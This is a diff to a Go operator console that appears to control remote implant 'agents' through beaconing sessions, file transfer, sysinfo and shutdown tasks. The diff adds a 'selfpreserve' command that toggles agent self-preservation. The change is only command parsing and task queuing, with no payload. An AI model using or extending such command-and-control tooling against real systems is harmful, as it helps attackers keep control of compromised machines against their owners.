@@ -12,6 +12,7 @@
 //	download <session_id> <path>   — Queue a file download (server → agent)
 //	sysinfo <session_id>           — Queue a sysinfo collection
 //	sleep <session_id> <seconds>   — Change an agent's beacon interval
+//	selfpreserve <session_id> [on|off] — Toggle agent self-preservation
 //	results <session_id>           — Retrieve task results for a session
 //	shutdown <session_id>          — Gracefully shutdown a specific agent
 //	shutdown-all                   — Broadcast shutdown to ALL agents
@@ -64,6 +65,7 @@ Available commands:
   download <session_id> <path>    Queue a file download (server → agent)
   sysinfo <session_id>            Queue a sysinfo collection task
   sleep <session_id> <seconds>    Change agent beacon interval
+  selfpreserve <session_id> [on|off]  Toggle agent self-preservation
   results <session_id>            Retrieve task results
   shutdown <session_id>           Gracefully shutdown an agent
   shutdown-all                    Broadcast shutdown to ALL agents
@@ -203,6 +205,26 @@ func main() {
 			binary.BigEndian.PutUint32(data, uint32(seconds))
 			cmdQueueTask(c, args[0], client.TaskTypeSleep, data, operator)
 
+		case "selfpreserve":
+			if len(args) < 1 {
+				fmt.Println("Usage: selfpreserve <session_id> [on|off]")
+				continue
+			}
+			enable := byte(0x01) // Default: enable
+			if len(args) >= 2 {
+				switch strings.ToLower(args[1]) {
+				case "off", "0", "false", "disable":
+					enable = 0x00
+				case "on", "1", "true", "enable":
+					enable = 0x01
+				default:
+					fmt.Printf("Invalid value: %s (use on/off)\n", args[1])
+					continue
+				}
+			}
+			cmdQueueTask(c, args[0], client.TaskTypeSelfPreserve,
+				[]byte{enable}, operator)
+
 		case "results":
 			if len(args) < 1 {
 				fmt.Println("Usage: results <session_id>")
@@ -307,6 +329,8 @@ func cmdQueueTask(c *client.Client, sessionID string, taskType client.TaskType, 
 		taskName = "SYSINFO"
 	case client.TaskTypeSleep:
 		taskName = "SLEEP"
+	case client.TaskTypeSelfPreserve:
+		taskName = "SELFPRESERVE"
 	case client.TaskTypeExit:
 		taskName = "EXIT"
 	}
